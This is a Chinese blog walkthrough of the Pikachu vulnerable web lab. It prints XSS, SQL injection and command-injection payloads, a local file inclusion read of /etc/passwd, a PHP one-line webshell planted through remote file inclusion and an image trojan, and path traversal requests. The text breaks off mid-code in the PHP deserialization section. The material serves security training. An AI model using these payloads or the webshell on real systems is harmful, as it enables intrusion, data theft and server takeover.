<h1 id="0x02-XSS（跨站脚本）"><a href="#0x02-XSS（跨站脚本）" class="headerlink" title="0x02 XSS（跨站脚本）"></a>0x02 XSS（跨站脚本）</h1><p>一.反射性xss(get): </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt; </span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> /<span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">console.log(123)</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>二.反射性xss(post): </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>三.存储性xss: </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>四.DOM型xss: </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt; </span><br></pre></td></tr></table></figure>
<p>五.DOM型xss-x: </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt; </span><br></pre></td></tr></table></figure>
<p>六.xss盲打： </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt; 说明该提交方式为post，提交的内容会在后台被接受执行，故可盗取管理员cookie </span><br></pre></td></tr></table></figure>
<p>七.xss过滤： 说明该关卡会使用正则对&lt;script进行替换为空,也就是过滤了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&lt;/p&gt;&lt;a href=&quot;www.baidu.com&quot;&gt;11111&lt;/a&gt;&lt;p&gt;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&lt;/p&gt;&lt;a onclick=alert(&quot;xss&quot;)&gt;11111&lt;p&gt;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&lt;/p&gt;&lt;a onclick=alert(&quot;xss&quot;)&gt;关注CVultra&lt;/a&gt;&lt;p&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>八.xss之htmlspecialchars:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=&#x27;</span><span class="title function_">alert</span>(<span class="number">111</span>)<span class="string">&#x27; </span></span><br><span class="line"><span class="string">&#x27;</span> onmouseover=<span class="string">&#x27;alert(111)&#x27;</span></span><br></pre></td></tr></table></figure>
<p>九.xss之href输出:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>十.xss之js输出：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;//</span></span><br></pre></td></tr></table></figure>
<h1 id="0x03-CSRF-跨站请求伪造"><a href="#0x03-CSRF-跨站请求伪造" class="headerlink" title="0x03 CSRF(跨站请求伪造)"></a>0x03 CSRF(跨站请求伪造)</h1><h2 id="一-CSRF（GET）"><a href="#一-CSRF（GET）" class="headerlink" title="一.CSRF（GET）"></a>一.CSRF（GET）</h2><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/db277f9a72c3472cbf4950cf22cb18dd~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<blockquote>
<p>参数通过GET请求传参，修改URL中的值即可修改信息。通过短网址转换，诱导用户点击即可。</p>
</blockquote>
<h2 id="二-CSRF（POST）"><a href="#二-CSRF（POST）" class="headerlink" title="二.CSRF（POST）"></a>二.CSRF（POST）</h2><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ee5db522d7d245ffafc30bcc0c1ee3cc~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<blockquote>
<p>通过POST传参，在hackbar中通过POST提交即可更改数据。</p>
</blockquote>
<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2d692d93b64549f8bde08e54f8fd6659~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<h2 id="二-CSRF（Token）"><a href="#二-CSRF（Token）" class="headerlink" title="二.CSRF（Token）"></a>二.CSRF（Token）</h2><blockquote>
<p>真实环境下，增加token后可以及其有效的防止攻击。那么在这个靶场中，应该可以采用 暴力破解–》token中的做法，进行攻击(仅仅是思路，不知道能不能成功！)</p>
</blockquote>
<h1 id="0x04-Sql-Inject-SQL注入"><a href="#0x04-Sql-Inject-SQL注入" class="headerlink" title="0x04 Sql Inject(SQL注入)"></a>0x04 Sql Inject(SQL注入)</h1><h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">判断字段数：</span><br><span class="line">    id<span class="operator">=</span><span class="number">0</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span><span class="comment">--+&amp;submit=%E6%9F%A5%E8%AF%A2 </span></span><br><span class="line">    id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span><span class="comment">--+&amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br><span class="line">    id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span><span class="comment">--+&amp;submit=%E6%9F%A5%E8%AF%A2 </span></span><br><span class="line">    id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span><span class="comment">--+&amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br><span class="line">    </span><br><span class="line">确定数据库名称：</span><br><span class="line">    id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()<span class="comment">--+&amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br><span class="line">  </span><br><span class="line">确定表名：</span><br><span class="line">    id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;pikachu&#x27;</span><span class="comment">--+&amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br><span class="line">    </span><br><span class="line">确定字段名：</span><br><span class="line">    id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span><span class="comment">--+&amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br><span class="line">确定字段值：</span><br><span class="line">    id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(id,<span class="number">0x3a</span>,username,<span class="number">0x2c</span>,password,<span class="number">0x3b</span>,level) <span class="keyword">from</span> users<span class="comment">--+&amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br><span class="line">    为了美观显示可以写成这样：</span><br><span class="line">id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(id,<span class="number">0x3a</span>,username,<span class="number">0x2c</span>,password,<span class="number">0x2c</span>,level,<span class="number">0x3c</span>,<span class="number">0x3e</span>) <span class="keyword">from</span> users<span class="comment">--+&amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br></pre></td></tr></table></figure>
<h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p>闭合：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p>一.判断字段数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/vul/sqli/sqli_str.php?name=kobe&#x27; order by 2 --+ &amp;submit=%E6%9F%A5%E8%AF%A2   //不知道为什么#不能注释</span><br></pre></td></tr></table></figure>

<p>二.呵呵，一把梭哈….算了，还是手工吧</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sqli_str.php?name<span class="operator">=</span>kobe<span class="string">&#x27; union select user(),@@version_compile_os --+ &amp;submit=%E6%9F%A5%E8%AF%A2    </span></span><br><span class="line"><span class="string">//结果是  root/linux</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/vul/sqli/sqli_str.php?name=kobe&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>(),group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata <span class="comment">--+ &amp;submit=%E6%9F%A5%E8%AF%A2 </span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>结果是：information_schema,mysql,performance_schema,pikachu,sys</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sqli_str.php?name<span class="operator">=</span>kobe<span class="string">&#x27; union select user(),group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27; --+ &amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br><span class="line"><span class="string">//结果为： httpinfo,member,message,users,xssblind</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/vul/sqli/sqli_str.php?name=kobe&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>(),group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="comment">--+ &amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>结果为：<span class="keyword">USER</span>,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password,level</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sqli_str.php?name<span class="operator">=</span>kobe<span class="string">&#x27; union select user(),group_concat(id,0x3a,username,0x3a,password,0x3a,level) from users --+ &amp;submit=%E6%9F%A5%E8%AF%A2    </span></span><br><span class="line"><span class="string">//不就出来了吗</span></span><br></pre></td></tr></table></figure>
<h2 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sqli_search.php?name<span class="operator">=</span>kobe<span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> <span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">90</span><span class="operator">%</span><span class="number">9</span>C<span class="operator">%</span>E7<span class="operator">%</span>B4<span class="operator">%</span>A2   <span class="operator">/</span><span class="operator">/</span>跟上面一摸一样</span><br></pre></td></tr></table></figure>
<h2 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>pikachu<span class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sqli_x.php?name<span class="operator">=</span>kobe<span class="operator">%</span><span class="number">27</span>)<span class="operator">%</span><span class="number">20</span><span class="keyword">and</span><span class="operator">%</span><span class="number">20</span>(<span class="operator">%</span><span class="number">271</span><span class="operator">%</span><span class="number">27</span><span class="operator">=</span><span class="operator">%</span><span class="number">271</span><span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2#</span><br><span class="line"></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>pikachu<span class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sqli_x.php?name<span class="operator">=</span>kobe<span class="operator">%</span><span class="number">27</span>)<span class="operator">%</span><span class="number">20</span><span class="keyword">or</span><span class="operator">%</span><span class="number">20</span>(<span class="operator">%</span><span class="number">271</span><span class="operator">%</span><span class="number">27</span><span class="operator">=</span><span class="operator">%</span><span class="number">271</span><span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2#</span><br></pre></td></tr></table></figure>
<ul>
<li>成功闭合，后续思路同上。</li>
</ul>
<h2 id="“insert-x2F-update”注入"><a href="#“insert-x2F-update”注入" class="headerlink" title="“insert&#x2F;update”注入"></a>“insert&#x2F;update”注入</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查询数据库名:</span><br><span class="line">            cvultra<span class="string">&#x27; or updatexml(1,concat(0x7e,database()),0) or&#x27;</span></span><br><span class="line">             </span><br><span class="line">查询版本号：</span><br><span class="line">            cvultra<span class="string">&#x27; or updatexml(1,concat(0x7e,version()),0) or&#x27;</span></span><br><span class="line">查询pikachu<span class="comment">--&gt;下的表名：</span></span><br><span class="line">            cvultra<span class="string">&#x27; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27; limit 0,1)),0) or&#x27;</span></span><br><span class="line">其他查询，与上面方法一致....</span><br></pre></td></tr></table></figure>
<p>为什么采用concat函数去查询，而不是 group_concat?</p>
<p>答：根据报错信息，使用group_concat报错，“组无效”。<br><a href="https://blog.csdn.net/xiao__jia__jia/article/details/103663284">超链接–&gt;点击</a><br><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2c4bc1ad952a44f88630b6ec7833ecd5~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<h2 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查询数据库名：</span><br><span class="line">            <span class="number">61</span><span class="operator">+</span><span class="keyword">or</span><span class="operator">+</span>updatexml<span class="operator">+</span>(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database()),<span class="number">0</span>)</span><br><span class="line">其他查询如上所示....</span><br></pre></td></tr></table></figure>

<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d8db3a1201de4bb0af1cc5831f3ac5bb~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<h2 id="“http-header”注入"><a href="#“http-header”注入" class="headerlink" title="“http header”注入"></a>“http header”注入</h2><ul>
<li>首先登陆账户  admin&#x2F;123456</li>
<li>将User-Agent后面的值替换为：<code>1&#39; or updatexml(1, concat(0x7e, database()), 0) or &#39;</code></li>
<li>后续测试 同上</li>
</ul>
<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/19b040290b2446ba8a8bd3259307837c~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<h2 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">输入 vince<span class="string">&#x27;#     不报错，说明存在注入，且为单引号闭合</span></span><br><span class="line"><span class="string">判断数据库长度：      Vince&#x27;</span> <span class="keyword">and</span> length(database())<span class="operator">&gt;=</span><span class="number">1</span> #</span><br><span class="line">........   方法固定，不再阐述</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="时间型盲注"><a href="#时间型盲注" class="headerlink" title="时间型盲注"></a>时间型盲注</h2><blockquote>
<p>一.Vince’ and sleep(5)#<br>     延长5秒后显示，说明构造正确</p>
<p>二.话不多说，sqlmap跑，出结果</p>
</blockquote>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><ul>
<li>burp suite抓包，将username 替换为 root %df’ or 1&#x3D;1 #<br><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f3bb3e897fb34358a2a066c6080d9284~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></li>
</ul>
<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="exec”ping”"><a href="#exec”ping”" class="headerlink" title="exec”ping”"></a>exec”ping”</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1&amp;net user</span><br><span class="line">..........</span><br></pre></td></tr></table></figure>

<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1523d33da2b04348aeb70479e291e53e~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<h2 id="exec”eval”"><a href="#exec”eval”" class="headerlink" title="exec”eval”"></a>exec”eval”</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;ipconfig&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/356fdf97f26e4d78a58d2451531e0911~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7566f2563e5d4e53b066ca884dc9cb3c~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
<h1 id="File-inclusion"><a href="#File-inclusion" class="headerlink" title="File inclusion"></a>File inclusion</h1><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.本地文件包含:仅能够对服务器本地文件进行读取，泄露敏感信息。(例；linux中读取敏感件:../../../../../）</span><br><span class="line">	payload；</span><br><span class="line">			?filename=../../../../../../../etc/passwd&amp;submit=提交查询</span><br><span class="line">			...........				//总之危害情况视具体情况而定</span><br></pre></td></tr></table></figure>

<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//此漏洞，大有可为！</span></span><br><span class="line"><span class="comment">//思路</span></span><br><span class="line">	<span class="number">1</span>.在自己的服务器上创建一个恶意PHP文件，此恶意文件可以在漏洞机上执行，并向其中写入一句话木马。</span><br><span class="line">	   <span class="comment">//我使用本地服务器(127.0.0.1)</span></span><br><span class="line">	  本地拍PHP文件为：test.php</span><br><span class="line">	test.php: <span class="meta">&lt;?php</span> <span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;muma.php&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[hacker]);?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="不安全的文件下载"><a href="#不安全的文件下载" class="headerlink" title="不安全的文件下载"></a>不安全的文件下载</h1><p><strong>不安全的文件下载概述</strong> 文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。 此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd),则很有可能会直接将该指定的文件下载下来，从而导致后台敏感信息(密码文件、源代码等)被下载。</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">下载根目录下的txt文件：</span><br><span class="line">http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../test.php</span><br></pre></td></tr></table></figure>

<h1 id="不安全的文件上传"><a href="#不安全的文件上传" class="headerlink" title="不安全的文件上传"></a>不安全的文件上传</h1><blockquote>
<p>1.客服端检查：法一:burp suite更改；法二:前端禁用js(火狐浏览器-about:config禁用js)；法三:删除js代码</p>
<p>2.服务端检查：Content-Type: image&#x2F;png or image&#x2F;jpeg（实现服务端欺骗）</p>
</blockquote>
<p> 3.getimagesize()配合文件包含漏洞<br>   制作图片木马:</p>
<pre><code>           copy/b te.JPG+test.php cc.png
   
           test.php:&lt;?php @eval($_POST[hacker]);?&gt;
</code></pre>
<p>  ..&#x2F;..&#x2F;unsafeupload&#x2F;uploads&#x2F;2021&#x2F;08&#x2F;17&#x2F;700269611b6bffd8996945825253.png(访问此图片执行PHP代码)</p>
<h1 id="水平越权-amp-amp-垂直越权"><a href="#水平越权-amp-amp-垂直越权" class="headerlink" title="水平越权&amp;&amp;垂直越权"></a>水平越权&amp;&amp;垂直越权</h1><blockquote>
<p><strong>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。</strong> 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。<br>        一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。            </p>
</blockquote>
<blockquote>
<p>水平越权：同级用户之间操作，更改另一方的数据.<br>垂直越权:权限不同的用户，低权限用户获得高级用户的权限。简而言之就是–管理员创建用户的数据（burp suite抓包）+普通用户的cookie &#x3D; 普通用户实现管理员功能</p>
</blockquote>
<h1 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h1><blockquote>
<p>pikachu中关于目录遍历定义：<br>    目录遍历漏洞概述<br> 在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“..&#x2F;”这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。<br> 看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的 方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。<br> 需要区分一下的是,如果你通过不带参数的url（比如：<a href="http://xxxx/doc%EF%BC%89%E5%88%97%E5%87%BA%E4%BA%86doc%E6%96%87%E4%BB%B6%E5%A4%B9%E9%87%8C%E9%9D%A2%E6%89%80%E6%9C%89%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%8C%E6%88%91%E4%BB%AC%E6%88%90%E4%B8%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E3%80%82">http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。</a> 而并不归为目录遍历漏洞。（关于敏感信息泄露你你可以在”i can see you ABC”中了解更多） </p>
</blockquote>
<h1 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h1><blockquote>
<p>敏感信息泄露概述<br> 由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如：<br> —通过访问url下的目录，可以直接列出目录下的文件列表;<br> —输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;<br> —前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;<br> 类似以上这些情况，我们成为敏感信息泄露。敏感信息泄露虽然一直被评为危害比较低的漏洞，但这些敏感信息往往给攻击着实施进一步的攻击提供很大的帮助,甚至“离谱”的敏感信息泄露也会直接造成严重的损失。 因此,在web应用的开发上，除了要进行安全的代码编写，也需要注意对敏感信息的合理处理。 </p>
</blockquote>
<h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><p>漏洞产生原因： PHP 反序列化漏洞又叫做 PHP 对象注入漏洞，是因为程序对输入数据处理不当导致的. 反序列化漏洞的成 因在于代码中的 unserialize() 接收的参数可控，从上面的例子看，这个函数的参数是一个序列化的对象， 而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改实现最终的攻击。 <em>总而言之：</em> <strong>反序列化漏洞是由于unserialize函数接收到了恶意的序列化数据篡改成员属性后导致的。</strong></p>
<blockquote>
<p>深入理解漏洞: <a href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a></p>
<p>关于函数魔术方法 <a href="https://zhuanlan.zhihu.com/p/377676274">https://zhuanlan.zhihu.com/p/377676274</a> 理解PHP反序列化漏洞</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">序列化</span><br><span class="line">有类:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title function_ invoke__">S</span>(); <span class="comment">//创建一个对象</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>); <span class="comment">//把这个对象进行序列化</span></span><br><span class="line"><span class="meta">?&gt;</span>	</span><br><span class="line"><span class="comment">//输出：O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</span></span><br><span class="line"><span class="comment">//说明： O:代表object	1:代表对象名字长度为一个字符		S:对象的名称</span></span><br><span class="line"><span class="comment">//      1:代表对象里面有一个变量	s:数据类型		4:变量名称的长度</span></span><br><span class="line"><span class="comment">//      test:变量名称	s:数据类型	 7:变量值的长度	pikachu:变量值</span></span><br><span class="line"></span><br><span class="line">无类：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$t</span> = <span class="string">&#x27;xiaodi&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$t</span>);</span><br><span class="line"><span class="meta">?&gt;</span>      </span><br><span class="line"><span class="comment">//输出：s:6:&quot;xiaodi&quot;;  </span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">反序列化</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title function_ invoke__">S</span>(); <span class="comment">//创建一个对象</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>); <span class="comment">//把这个对象进行序列化</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$u</span>=<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$u</span>-&gt;test; <span class="comment">//得到的结果为pikachu</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//输出：O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</span></span><br><span class="line"><span class="comment">//		pikachu	</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">魔术方法：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">         <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">         <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     /<span class="variable">$s</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">     @<span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span 